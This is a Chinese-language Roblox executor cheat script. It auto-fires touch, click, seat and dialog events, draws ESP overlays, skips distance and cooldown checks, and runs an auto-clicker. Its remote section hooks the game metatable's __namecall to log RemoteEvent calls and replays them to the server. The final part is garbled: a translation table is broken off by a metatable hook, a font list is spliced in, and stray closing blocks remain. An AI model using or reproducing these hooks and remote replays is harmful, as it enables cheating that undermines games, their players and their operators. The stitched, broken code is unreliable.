local TouchedSection = TriggerTab:section("直接Touched事件", false)

TouchedSection:Button("触发所有Touched事件", function()
    for _, part in pairs(game:GetService("Workspace"):GetDescendants()) do
        if part:IsA("BasePart") and part:FindFirstChild("TouchedConnection") then
            pcall(function()
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    firetouchinterest(char.HumanoidRootPart, part, 0)
                    task.wait()
                    firetouchinterest(char.HumanoidRootPart, part, 1)
                end
            end)
        end
    end
end)

TouchedSection:Toggle("自动触发Touched事件", "AutoTouched", false, function(state)
    getgenv().AutoTouched = state
    if state then
        spawn(function()
            while getgenv().AutoTouched do
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    local root = char.HumanoidRootPart
                    for _, part in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if part:IsA("BasePart") and part:FindFirstChild("TouchedConnection") then
                            if (root.Position - part.Position).Magnitude <= (getgenv().TouchTriggerRange or 20) then
                                pcall(function()
                                    firetouchinterest(root, part, 0)
                                    task.wait()
                                    firetouchinterest(root, part, 1)
                                end)
                            end
                        end
                    end
                end
                task.wait(0.3)
            end
        end)
    end
end)

TouchedSection:Toggle("透视Touched部件", "ESP_Touched", false, function(state)
    getgenv().ESPTouched = state
    if state then
        spawn(function()
            while getgenv().ESPTouched do
                ESP:Clear()
                for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                    if v:IsA("BasePart") and v:FindFirstChild("TouchedConnection") then
                        ESP:Create(v, "Touched", Color3.fromRGB(255, 128, 0))
                    end
                end
                task.wait(1)
            end
        end)
    else
        ESP:Clear()
    end
end)

TouchedSection:Toggle("阻挡Touch事件", "Touch Blocker", false, function(state)
    getgenv().TouchBlockEnabled = state
    
    if state then
        spawn(function()
            while getgenv().TouchBlockEnabled do
                local character = game.Players.LocalPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") then
                    local humanoidRootPart = character.HumanoidRootPart
                    local parts = workspace:GetPartBoundsInRadius(humanoidRootPart.Position, 10)
                    
                    for _, part in ipairs(parts) do
                        if part:IsA("BasePart") then
                            pcall(function()
                                part.CanTouch = false
                            end)
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    else
        spawn(function()
            for _, part in ipairs(workspace:GetDescendants()) do
                if part:IsA("BasePart") and part.CanTouch == false then
                    pcall(function()
                        part.CanTouch = true
                    end)
                end
            end
        end)
    end
end)

local GUISection = TriggerTab:section("GUI按钮触发", false)

GUISection:Button("触发所有GUI按钮", function()
    for _, gui in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants()) do
        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            pcall(function()
                firesignal(gui.MouseButton1Click)
                firesignal(gui.Activated)
            end)
        end
    end
end)

GUISection:Toggle("自动点击GUI按钮", "AutoClickGUI", false, function(state)
    getgenv().AutoClickGUI = state
    if state then
        spawn(function()
            while getgenv().AutoClickGUI do
                for _, gui in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants()) do
                    if (gui:IsA("TextButton") or gui:IsA("ImageButton")) and gui.Visible and gui.Active then
                        pcall(function()
                            firesignal(gui.MouseButton1Click)
                        end)
                    end
                end
                task.wait(1)
            end
        end)
    end
end)

GUISection:Toggle("高亮可点击GUI", "ESP_GUI", false, function(state)
    getgenv().ESP_GUI = state
    if state then
        spawn(function()
            while getgenv().ESP_GUI do
                for _, gui in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants()) do
                    if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                        if gui.Visible and gui.AbsolutePosition then
                            if not gui:FindFirstChild("BS_GUIESP") then
                                local screenESP = Instance.new("TextLabel")
                                screenESP.Name = "BS_GUIESP"
                                screenESP.Size = UDim2.new(0, 100, 0, 30)
                                screenESP.Position = UDim2.new(0, gui.AbsolutePosition.X, 0, gui.AbsolutePosition.Y)
                                screenESP.Text = "GUI"
                                screenESP.TextColor3 = Color3.fromRGB(255, 255, 0)
                                screenESP.BackgroundTransparency = 0.5
                                screenESP.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                                screenESP.Parent = gui
                            end
                        end
                    end
                end
                task.wait(1)
            end
        end)
    else
        for _, gui in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants()) do
            if gui:FindFirstChild("BS_GUIESP") then
                gui.BS_GUIESP:Destroy()
            end
        end
    end
end)

local VehicleSection = TriggerTab:section("座位/载具触发", false)

VehicleSection:Button("坐上所有座位", function()
    for _, seat in pairs(game:GetService("Workspace"):GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            pcall(function()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, seat, 0)
                task.wait()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, seat, 1)
            end)
        end
    end
end)

VehicleSection:Toggle("自动上载具", "AutoEnterVehicle", false, function(state)
    getgenv().AutoEnterVehicle = state
    if state then
        spawn(function()
            while getgenv().AutoEnterVehicle do
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("Humanoid") and char.Humanoid.SeatPart == nil then
                    for _, seat in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if (seat:IsA("Seat") or seat:IsA("VehicleSeat")) and seat.Occupant == nil then
                            if (char.HumanoidRootPart.Position - seat.Position).Magnitude <= (getgenv().VehicleRange or 30) then
                                pcall(function()
                                    firetouchinterest(char.HumanoidRootPart, seat, 0)
                                    task.wait()
                                    firetouchinterest(char.HumanoidRootPart, seat, 1)
                                end)
                            end
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
end)

VehicleSection:Textbox("载具触发范围", "VehicleRange", "输入范围值 (默认: 30)", function(value)
    local numValue = tonumber(value)
    if numValue then
        getgenv().VehicleRange = numValue
    end
end)

VehicleSection:Toggle("透视空座位", "ESP_Seats", false, function(state)
    getgenv().ESP_Seats = state
    if state then
        spawn(function()
            while getgenv().ESP_Seats do
                ESP:Clear()
                for _, seat in pairs(game:GetService("Workspace"):GetDescendants()) do
                    if (seat:IsA("Seat") or seat:IsA("VehicleSeat")) and seat.Occupant == nil then
                        ESP:Create(seat, "Seat", Color3.fromRGB(255, 255, 0))
                    end
                end
                task.wait(1)
            end
        end)
    else
        ESP:Clear()
    end
end)

local DialogSection = TriggerTab:section("对话框触发", false)

DialogSection:Button("触发所有对话框", function()
    for _, dialog in pairs(game:GetService("Workspace"):GetDescendants()) do
        if dialog:IsA("Dialog") then
            pcall(function()
                local character = game.Players.LocalPlayer.Character
                if character and character:FindFirstChild("Humanoid") then
                    dialog:SignalDialogChoiceSelected(character.Humanoid, dialog:GetDialogChoices()[1])
                end
            end)
        end
    end
end)

DialogSection:Toggle("自动对话", "AutoDialog", false, function(state)
    getgenv().AutoDialog = state
    if state then
        spawn(function()
            while getgenv().AutoDialog do
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("Humanoid") then
                    for _, dialog in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if dialog:IsA("Dialog") then
                            local distance = (char.HumanoidRootPart.Position - dialog.Parent.Position).Magnitude
                            if distance <= (getgenv().DialogRange or 20) then
                                pcall(function()
                                    local choices = dialog:GetDialogChoices()
                                    if #choices > 0 then
                                        dialog:SignalDialogChoiceSelected(char.Humanoid, choices[1])
                                    end
                                end)
                            end
                        end
                    end
                end
                task.wait(1)
            end
        end)
    end
end)

DialogSection:Textbox("对话范围", "DialogRange", "输入范围值 (默认: 20)", function(value)
    local numValue = tonumber(value)
    if numValue then
        getgenv().DialogRange = numValue
    end
end)

local RemoteSection = TriggerTab:section("远程事件(进阶)", false)

RemoteSection:Toggle("监听RemoteEvents", "SpyRemotes", false, function(state)
    getgenv().SpyRemotes = state
    if state then
        getgenv().RemoteLog = {}
        local mt = getrawmetatable(game)
        local old = mt.__namecall
        setreadonly(mt, false)
        
        mt.__namecall = newcclosure(function(self, ...)
            local args = {...}
            if SpyRemotes and self:IsA("RemoteEvent") then
                table.insert(RemoteLog, {
                    Name = self:GetFullName(),
                    Args = args,
                    Time = tick()
                })
                if ShowTriggerInfo then
                    print(string.format("[RemoteSpy] %s fired", self:GetFullName()))
                end
            end
            return old(self, ...)
        end)
        
        setreadonly(mt, true)
    end
end)

RemoteSection:Button("显示捕获的远程事件", function()
    if getgenv().RemoteLog then
        for i, log in ipairs(getgenv().RemoteLog) do
            print(string.format("[%d] %s - Args: %s", i, log.Name, #log.Args))
        end
    end
end)

RemoteSection:Toggle("自动重放远程事件", "AutoReplayRemotes", false, function(state)
    getgenv().AutoReplayRemotes = state
    if state and getgenv().RemoteLog then
        spawn(function()
            while getgenv().AutoReplayRemotes do
                if #RemoteLog > 0 then
                    local lastLog = RemoteLog[#RemoteLog]
                    pcall(function()
                        local remote = game:FindFirstChild(lastLog.Name)
                        if remote and remote:IsA("RemoteEvent") then
                            remote:FireServer(unpack(lastLog.Args))
                        end
                    end)
                end
                task.wait(1)
            end
        end)
    end
end)

local SettingsSection = TriggerTab:section("设置", false)

SettingsSection:Toggle("自动触发Prompt/Click无视交互距离限制", "IgnoreDistanceLimit", false, function(state)
    getgenv().IgnoreDistanceLimit = state
end)

SettingsSection:Toggle("自动忽略冷却时间", "IgnoreCooldown", false, function(state)
    getgenv().IgnoreCooldown = state
end)

SettingsSection:Toggle("显示触发信息", "ShowTriggerInfo", true, function(state)
    getgenv().ShowTriggerInfo = state
end)

SettingsSection:Toggle("显示触发范围圈", "ShowRangeCircle", false, function(state)
    getgenv().ShowRangeCircle = state
    if state then
        local range = Instance.new("Part")
        range.Name = "BS_RangeCircle"
        range.Shape = "Ball"
        range.Transparency = 0.7
        range.Material = "Neon"
        range.BrickColor = BrickColor.new("Bright blue")
        range.Anchored = true
        range.CanCollide = false
        range.Parent = workspace
        
        spawn(function()
            while ShowRangeCircle do
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    range.Position = char.HumanoidRootPart.Position
                    range.Size = Vector3.new(
                        (getgenv().TouchTriggerRange or 20) * 2,
                        (getgenv().TouchTriggerRange or 20) * 2,
                        (getgenv().TouchTriggerRange or 20) * 2
                    )
                end
                task.wait(0.1)
            end
            range:Destroy()
        end)
    else
        if workspace:FindFirstChild("BS_RangeCircle") then
            workspace.BS_RangeCircle:Destroy()
        end
    end
end)

SettingsSection:Toggle("智能延迟", "SmartDelay", true, function(state)
    getgenv().SmartDelay = state
end)

SettingsSection:Slider("全局触发延迟", "GlobalDelay", 0.1, 5, 0.5, 0.1, function(value)
    getgenv().GlobalDelay = value
end)

local InfoSection = TriggerTab:section("说明区", true)

InfoSection:Label("• TouchInterests: 可触碰类物体（如按钮、机关等）")
InfoSection:Label("• ClickDetectors: 可点击类物体（如可点击的部件）")
InfoSection:Label("• ProximityPrompts: 可互动类物体（NPC对话、收集品等）")
InfoSection:Label("• 直接Touched: 无TouchInterest的触摸事件")
InfoSection:Label("• GUI按钮: 自动点击玩家界面的按钮")
InfoSection:Label("• 座位/载具: 自动上座和进入载具")
InfoSection:Label("• 对话框: 自动与NPC对话交互")
InfoSection:Label("• 远程事件: 监听和重放网络事件（进阶）")
InfoSection:Label("• 自动功能开启后会持续检测并触发")
InfoSection:Label("• 快速互动可立即设置HoldDuration为0")
InfoSection:Label("• 无视交互距离限制：自动触发时忽略距离检测")
InfoSection:Label("• 忽略冷却时间：跳过所有交互冷却时间")
InfoSection:Label("• 透视功能可高亮显示可互动对象位置")
InfoSection:Label("• 触发范围圈可视化显示影响范围")
end

do

local settings = {
    clickDelay = 0.5,
    pressDuration = 0.01
}

    local clickerTab = Window:Tab("自动连点器", '107150227368485')
task.wait(0.1)
    wait(0.001)

    local settingsSection = clickerTab:section("参数设置", true)

    settingsSection:Textbox("点击间隔延迟(秒)", "clickDelay", "0.5", function(Value)
        local delay = tonumber(Value)
        if delay and delay > 0 then
            settings.clickDelay = delay
        end
    end)

    settingsSection:Textbox("按下持续时间(秒)", "pressDuration", "0.01", function(Value)
        local duration = tonumber(Value)
        if duration and duration >= 0 then
            settings.pressDuration = duration
        end
    end)

    local clicker = clickerTab:section("启动", true)
    local clickerUI       = nil
    local clickerConns    = {}
    local clickerRunning  = false

    local function safeConnect(signal, func)
        table.insert(clickerConns, signal:Connect(func))
    end

    local function buildAutoClicker()
        if clickerUI then return end

        local Players = game:GetService("Players")
        local VirtualInputManager = game:GetService("VirtualInputManager")
        local UserInputService = game:GetService("UserInputService")
        local CoreGui = game:GetService("CoreGui")
        local HttpService = game:GetService("HttpService")

        local LocalPlayer = Players.LocalPlayer
        local Targets = {}
        local isRunning = false
        local pointsVisible = true
        local defaultPanelTransparency = 0.2
        local defaultDotTransparency = 0.9

        local Icons = {
            Remove   = "rbxassetid://122610572797061",
            Start    = "rbxassetid://128832474920642",
            Stop     = "rbxassetid://113047868752296",
            Add      = "rbxassetid://80871366492449",
            Show     = "rbxassetid://89558029527587",
            Hidden   = "rbxassetid://82900330630483",
            Drag     = "rbxassetid://139381026962112",
            Delete   = "rbxassetid://105775511743927",
            Settings = "rbxassetid://70541424009556"
        }

        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "AutoClicker_Classic"
        ScreenGui.ResetOnSpawn = false
        pcall(function() ScreenGui.Parent = CoreGui end)
        if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
        clickerUI = ScreenGui

        local Panel = Instance.new("Frame")
        Panel.Name = "MainPanel"
        Panel.Parent = ScreenGui
        Panel.BackgroundColor3 = Color3.new(1, 1, 1)
        Panel.BackgroundTransparency = defaultPanelTransparency
        Panel.Position = UDim2.new(0, 16, 0, 34)
        Panel.Size = UDim2.new(0, 30, 0, 204)
        Panel.BorderSizePixel = 0

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 2)
        corner.Parent = Panel

        local layout = Instance.new("UIListLayout")
        layout.Parent = Panel
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        layout.Padding = UDim.new(0, 2)
        layout.SortOrder = Enum.SortOrder.LayoutOrder

        local SettingsUI = Instance.new("Frame")
        SettingsUI.Name = "SettingsUI"
        SettingsUI.Parent = ScreenGui
        SettingsUI.BackgroundColor3 = Color3.new(1, 1, 1)
        SettingsUI.BackgroundTransparency = defaultPanelTransparency
        SettingsUI.Position = UDim2.new(0.5, -100, 0.5, -75)
        SettingsUI.Size = UDim2.new(0, 200, 0, 150)
        SettingsUI.Visible = false
        SettingsUI.BorderSizePixel = 0

        local settingsCorner = Instance.new("UICorner")
        settingsCorner.CornerRadius = UDim.new(0, 2)
        settingsCorner.Parent = SettingsUI

        local settingsLayout = Instance.new("UIListLayout")
        settingsLayout.Parent = SettingsUI
        settingsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        settingsLayout.Padding = UDim.new(0, 10)
        settingsLayout.SortOrder = Enum.SortOrder.LayoutOrder

        local function makeDrag(obj, handle)
            handle = handle or obj
            local state = {}
            safeConnect(handle.InputBegan, function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    state[input] = {
                        object = obj,
                        startPos = obj.Position,
                        dragStart = input.Position,
                        isDragging = true
                    }
                end
            end)
            safeConnect(handle.InputEnded, function(input)
                if state[input] and state[input].object == obj then
                    state[input] = nil
                end
            end)
            safeConnect(UserInputService.InputChanged, function(input)
                if state[input] and state[input].isDragging then
                    local delta = input.Position - state[input].dragStart
                    obj.Position = UDim2.new(
                        state[input].startPos.X.Scale,
                        state[input].startPos.X.Offset + delta.X,
                        state[input].startPos.Y.Scale,
                        state[input].startPos.Y.Offset + delta.Y
                    )
                end
            end)
        end

        makeDrag(SettingsUI)
        makeDrag(Panel)

        local function createBtn(name, icon, order, scale)
            local btn = Instance.new("ImageButton")
            btn.Name = name
            btn.Parent = Panel
            btn.BackgroundTransparency = 1
            btn.Image = icon
            btn.ImageColor3 = Color3.new(0, 0, 0)
            btn.LayoutOrder = order
            local sz = (name == "EyeBtn" and 20 or 24) * (scale or 1)
            btn.Size = UDim2.new(0, sz, 0, sz)
            return btn
        end
        local function createSpacer(h, order)
            local f = Instance.new("Frame")
            f.Name = "Spacer"
            f.Parent = Panel
            f.BackgroundTransparency = 1
            f.Size = UDim2.new(0, 24, 0, h)
            f.LayoutOrder = order
        end

        local PlayBtn   = createBtn("PlayBtn", Icons.Start, 1, 1)
        local AddBtn    = createBtn("AddBtn", Icons.Add, 2, 1)
        local RemoveBtn = createBtn("RemoveBtn", Icons.Remove, 3, 1)
        createSpacer(6, 4)
        local SettingsBtn = createBtn("SettingsBtn", Icons.Settings, 5, 0.6)
        createSpacer(6, 6)
        local EyeBtn = createBtn("EyeBtn", Icons.Show, 7, 1)
        createSpacer(6, 8)
        local DragBtn = createBtn("DragBtn", Icons.Drag, 9, 0.6)
        createSpacer(6, 10)
        local DeleteBtn = createBtn("DeleteBtn", Icons.Delete, 11, 0.5)

        local function createDot(index, savedPos)
            local dot = Instance.new("ImageLabel")
            dot.Name = "ClickDot"
            dot.Parent = ScreenGui
            dot.BackgroundColor3 = Color3.new(1, 1, 1)
            dot.BackgroundTransparency = defaultDotTransparency
            dot.Size = UDim2.new(0, 20, 0, 20)
            dot.Visible = pointsVisible
            dot.Active = false
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(1, 0)
            corner.Parent = dot
            local icon = Instance.new("ImageLabel")
            icon.Name = "Icon"
            icon.Parent = dot
            icon.Image = "rbxassetid://110626268563466"
            icon.Size = UDim2.new(0, 30, 0, 30)
            icon.Position = UDim2.new(0.5, 0, 0.5, 0)
            icon.AnchorPoint = Vector2.new(0.5, 0.5)
            icon.BackgroundTransparency = 1
            local label = Instance.new("TextLabel")
            label.Parent = dot
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = tostring(index)
            label.Font = Enum.Font.GothamBold
            label.TextSize = 16

            if savedPos then
                dot.Position = UDim2.new(unpack(savedPos))
            else
                local ox = ((index - 1) % 5) * 40
                local oy = math.floor((index - 1) / 5) * 40
                dot.Position = UDim2.new(0.5, ox - 80, 0.5, oy - 40)
            end

            makeDrag(dot)
            return dot
        end

        safeConnect(AddBtn.MouseButton1Click, function()
            local dot = createDot(#Targets + 1)
            table.insert(Targets, dot)
        end)

        safeConnect(RemoveBtn.MouseButton1Click, function()
            local last = table.remove(Targets)
            if last then last:Destroy() end
        end)

        safeConnect(SettingsBtn.MouseButton1Click, function()
            SettingsUI.Visible = not SettingsUI.Visible
        end)

        safeConnect(DeleteBtn.MouseButton1Click, function()
            isRunning = false
            for i = #Targets, 1, -1 do
                if Targets[i] then Targets[i]:Destroy(); table.remove(Targets, i) end
            end
            Targets = {}
            ScreenGui:Destroy()
            for _, c in ipairs(clickerConns) do c:Disconnect() end
            clickerConns = {}
            clickerUI = nil
        end)

        safeConnect(EyeBtn.MouseButton1Click, function()
            pointsVisible = not pointsVisible
            EyeBtn.Image = pointsVisible and Icons.Show or Icons.Hidden
            for _, dot in ipairs(Targets) do dot.Visible = pointsVisible end
        end)

        local function createSettingsBtn(text, order, callback)
            local btn = Instance.new("TextButton")
            btn.Name = text
            btn.Parent = SettingsUI
            btn.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
            btn.BackgroundTransparency = 0.1
            btn.Size = UDim2.new(0, 180, 0, 40)
            btn.Font = Enum.Font.GothamSemibold
            btn.Text = text
            btn.TextSize = 14
            btn.TextColor3 = Color3.new(0, 0, 0)
            btn.LayoutOrder = order
            local btnCorner = Instance.new("UICorner")
            btnCorner.CornerRadius = UDim.new(0, 2)
            btnCorner.Parent = btn
            safeConnect(btn.MouseButton1Click, callback)
            return btn
        end

        createSettingsBtn("保存位置", 1, function()
            local dotData = {}
            for i, dot in ipairs(Targets) do
                dotData[i] = {Position = {dot.Position.X.Scale, dot.Position.X.Offset, dot.Position.Y.Scale, dot.Position.Y.Offset}}
            end
            local data = {
                panelPosition = {Panel.Position.X.Scale, Panel.Position.X.Offset, Panel.Position.Y.Scale, Panel.Position.Y.Offset},
                settingsPosition = {SettingsUI.Position.X.Scale, SettingsUI.Position.X.Offset, SettingsUI.Position.Y.Scale, SettingsUI.Position.Y.Offset},
                dotData = dotData
            }
            if not isfolder("tubers93脚本") then makefolder("tubers93脚本") end
            writefile("tubers93脚本/自动点击器.txt", HttpService:JSONEncode(data))
        end)

        createSettingsBtn("清空保存", 2, function()
            if isfile("tubers93脚本/自动点击器.txt") then delfile("tubers93脚本/自动点击器.txt") end
        end)

        local function loadData()
            if isfile("tubers93脚本/自动点击器.txt") then
                local ok, data = pcall(function() return HttpService:JSONDecode(readfile("tubers93脚本/自动点击器.txt")) end)
                if ok and data then
                    if data.panelPosition then Panel.Position = UDim2.new(unpack(data.panelPosition)) end
                    if data.settingsPosition then SettingsUI.Position = UDim2.new(unpack(data.settingsPosition)) end
                    if data.dotData then
                        for i, d in ipairs(data.dotData) do
                            local dot = createDot(i, d.Position)
                            table.insert(Targets, dot)
                        end
                    end
                end
            end
        end
        loadData()

        safeConnect(PlayBtn.MouseButton1Click, function()
            isRunning = not isRunning
            if isRunning then
                Panel.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
                Panel.BackgroundTransparency = defaultPanelTransparency + 0.5
                PlayBtn.Image = Icons.Stop
                for _, dot in ipairs(Targets) do dot.BackgroundTransparency = defaultDotTransparency + 0.2 end

                task.spawn(function()
                    while isRunning do
                        if #Targets == 0 then break end
                        for _, target in ipairs(Targets) do
                            if not isRunning then break end
                            local pos = target.AbsolutePosition
                            local size = target.AbsoluteSize
                            local x = pos.X + size.X / 2 + 35
                            local y = pos.Y + size.Y / 2 + 50
                            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
                            task.wait(settings.pressDuration or 0.01)
                            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)
                            task.wait(settings.clickDelay or 0.5)
                        end
                        task.wait()
                    end
                    Panel.BackgroundColor3 = Color3.new(1, 1, 1)
                    Panel.BackgroundTransparency = defaultPanelTransparency
                    PlayBtn.Image = Icons.Start
                    for _, dot in ipairs(Targets) do dot.BackgroundTransparency = defaultDotTransparency end
                    isRunning = false
                end)
            else
                isRunning = false
                Panel.BackgroundColor3 = Color3.new(1, 1, 1)
                Panel.BackgroundTransparency = defaultPanelTransparency
                PlayBtn.Image = Icons.Start
                for _, dot in ipairs(Targets) do dot.BackgroundTransparency = defaultDotTransparency end
            end
        end)

        ScreenGui.Enabled = true
    end

    local function destroyAutoClicker()
        if not clickerUI then return end
        for _, c in ipairs(clickerConns) do c:Disconnect() end
        clickerConns = {}
        clickerUI:Destroy()
        clickerUI = nil
    end

    clicker:Toggle("GUI 开关", "clickerToggle", false, function(on)
        if on then
            buildAutoClicker()
        else
            destroyAutoClicker()
        end
    end)
end

local TaB = Window:Tab("FE", '98218034436456')
task.wait(0.1)
local FE = TaB:section("脚本", true)
FE:Button("Uhhhhhh(有饰品碰撞)", function()
local mt = getrawmetatable(game)
local old = mt.__newindex
local Value = {
    ["Kai Cenat and Speed jumping"] = "凯·塞纳特与斯皮德跳跃",
    ["Magyar"] = "匈牙利语",
    ["fall asleep fall asleep fall asleep"] = "睡吧睡吧睡吧",
    ["- Added April Fools themes"] = "- 新增愚人节主题",

    ["California Girls"] = "加州女孩",
    ["Purple"] = "紫色",
    ["<b>my math teacher</b>"] = "<b>我的数学老师</b>",
    ["\"Tired of your hats phasing through people? Uhhhhhh turns that fact upside-down!\""] = "“厌倦帽子穿人？Uhhhhhh彻底颠覆这点！”",

setreadonly(mt, false)
mt.__newindex = newcclosure(function(tt, kk, v)
    if kk == "Text" and (tt:IsA("TextLabel") or tt:IsA("TextButton") or tt:IsA("TextBox")) then
        v = Value[v] or v
    end
    return old(tt, kk, v)
end)

    ["SourceSansItalic (斜体)"] = Enum.Font.SourceSansItalic,
    ["GothamBold (粗黑体)"] = Enum.Font.GothamBold,
    ["GothamBlack (超粗体)"] = Enum.Font.GothamBlack,
    ["GothamSemibold (半粗体)"] = Enum.Font.GothamSemibold,
    ["GothamMedium (中等)"] = Enum.Font.GothamMedium,
    ["FredokaOne (圆润体)"] = Enum.Font.FredokaOne,
    ["Arial (标准体)"] = Enum.Font.Arial,
    ["ArialBold (标准粗体)"] = Enum.Font.ArialBold,
    ["RobotoMono (等宽体)"] = Enum.Font.RobotoMono,
    ["Cartoon (卡通体)"] = Enum.Font.Cartoon,
    ["Fantasy (奇幻体)"] = Enum.Font.Fantasy,
    ["Arcade (街机体)"] = Enum.Font.Arcade,
    ["SciFi (科幻体)"] = Enum.Font.SciFi,
    ["Highway (公路体)"] = Enum.Font.Highway,
    ["Legacy (怀旧体)"] = Enum.Font.Legacy
}

local function colorToTable(color)
    return {math.floor(color.R * 255), math.floor(color.G * 255), math.floor(color.B * 255)}
end

local function tableToColor(tbl)
    if type(tbl) == "table" and #tbl >= 3 then
        return Color3.fromRGB(tbl[1], tbl[2], tbl[3])
    end
    return Color3.fromRGB(255, 255, 255)
end

local function saveConfig()
    local success, config = pcall(function()
        return {
            font = _G.CurrentFont or "SourceSans (默认)",
            size = currentFontSize,
            color = colorToTable(currentTextColor),
            fakeBold = library.flags["FakeBold"] or false,
            fakeItalic = library.flags["FakeItalic"] or false,
            underline = library.flags["Underline"] or false,
            useExclude = library.flags["UseExcludeList"] or false,
            excludePattern = excludePattern,
            excludeList = excludeList,
            autoApply = library.flags["AutoApplyFont"] or false,
            forceScaled = library.flags["ForceTextScaled"] or false,
            enableSizeLimit = library.flags["EnableSizeLimit"] or false,
            minSize = _G.MinFontSize or 8,
            maxSize = _G.MaxFontSize or 30,
            modifyLabels = library.flags["ModifyLabels"] ~= false,
            modifyButtons = library.flags["ModifyButtons"] ~= false,
            modifyBoxes = library.flags["ModifyBoxes"] ~= false
        }
    end)
    
    if success then
        pcall(function()
            local encoded = game:GetService("HttpService"):JSONEncode(config)
            writefile(configFile, encoded)
        end)
    end
end

local function loadConfig()
    local success, config = pcall(function()
        if isfile(configFile) then
            local content = readfile(configFile)
            return game:GetService("HttpService"):JSONDecode(content)
        end
        return nil
    end)
    
    if success and type(config) == "table" then
        _G.CurrentFont = config.font or "SourceSans (默认)"
        currentFontSize = config.size or 14
        currentTextColor = tableToColor(config.color)
        library.flags["FakeBold"] = config.fakeBold or false
        library.flags["FakeItalic"] = config.fakeItalic or false
        library.flags["Underline"] = config.underline or false
        library.flags["UseExcludeList"] = config.useExclude or false
        excludePattern = config.excludePattern or ""
        excludeList = config.excludeList or {}
        library.flags["AutoApplyFont"] = config.autoApply or false
        library.flags["ForceTextScaled"] = config.forceScaled or false
        library.flags["EnableSizeLimit"] = config.enableSizeLimit or false
        _G.MinFontSize = config.minSize or 8
        _G.MaxFontSize = config.maxSize or 30
        library.flags["ModifyLabels"] = config.modifyLabels ~= false
        library.flags["ModifyButtons"] = config.modifyButtons ~= false
        library.flags["ModifyBoxes"] = config.modifyBoxes ~= false
        return config
    end
    return nil
end

local function resetAndSaveConfig()
    _G.CurrentFont = "SourceSans (默认)"
    currentFontSize = 14
    currentFontEnum = Enum.Font.SourceSans
    currentTextColor = Color3.fromRGB(255, 255, 255)
    library.flags["FakeBold"] = false
    library.flags["FakeItalic"] = false
    library.flags["Underline"] = false
    library.flags["UseExcludeList"] = false
    excludePattern = ""
    excludeList = {}
    library.flags["AutoApplyFont"] = false
    library.flags["ForceTextScaled"] = false
    library.flags["EnableSizeLimit"] = false
    _G.MinFontSize = 8
    _G.MaxFontSize = 30
    library.flags["ModifyLabels"] = true
    library.flags["ModifyButtons"] = true
    library.flags["ModifyBoxes"] = true
    saveConfig()
end

local sectionFontPreview = tabFont:section("字体预览", true)

local previewLabel = sectionFontPreview:Label("示例文本: tubers93脚本脚本 v1.0.0")
local previewLabel2 = sectionFontPreview:Label("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
local previewLabel3 = sectionFontPreview:Label("abcdefghijklmnopqrstuvwxyz")
local previewLabel4 = sectionFontPreview:Label("1234567890 !@#$%^&*()")

local previewLabels = {previewLabel, previewLabel2, previewLabel3, previewLabel4}

local function applyConfigToPreview(config)
    if not config then return end
    
    local fontEnum = fontMap[config.font] or Enum.Font.SourceSans
    currentFontEnum = fontEnum
    
    for _, label in ipairs(previewLabels) do
        label.Font = fontEnum
        label.TextSize = config.size or 14
        if config.color then
            local color = tableToColor(config.color)
            label.TextColor3 = color
            currentTextColor = color
        end
    end
    
    if config.fakeBold then
        for _, label in ipairs(previewLabels) do
            label.TextStrokeTransparency = 0.5
            label.TextStrokeColor3 = label.TextColor3
        end
    end
    
    if config.fakeItalic then
        for _, label in ipairs(previewLabels) do
            label.Rotation = 5
        end
    end
end

local sectionFontSelector = tabFont:section("字体选择", true)

local fontDropdown = sectionFontSelector:Dropdown("选择全局字体", "SelectedFont", fonts, function(selected)
    local fontEnum = fontMap[selected]
    if fontEnum then
        previewLabel.Text = "示例文本: " .. selected
        for _, label in ipairs(previewLabels) do
            label.Font = fontEnum
        end
        _G.CurrentFont = selected
        currentFontEnum = fontEnum
        saveConfig()
    end
end)

local sectionFontSize = tabFont:section("字体大小", true)

local fontSizeSlider = sectionFontSize:Slider("大小调节", "FontSize", 14, 8, 30, false, function(value)
    for _, label in ipairs(previewLabels) do
        label.TextSize = value
    end
    currentFontSize = value
    saveConfig()
end)

    for _, label in ipairs(previewLabels) do
        label.TextSize = 10
    end
    currentFontSize = 10
    saveConfig()
end)

    for _, label in ipairs(previewLabels) do
        label.TextSize = 14
    end
    currentFontSize = 14
    saveConfig()
end)

    for _, label in ipairs(previewLabels) do
        label.TextSize = 20
    end
    currentFontSize = 20
    saveConfig()
end)

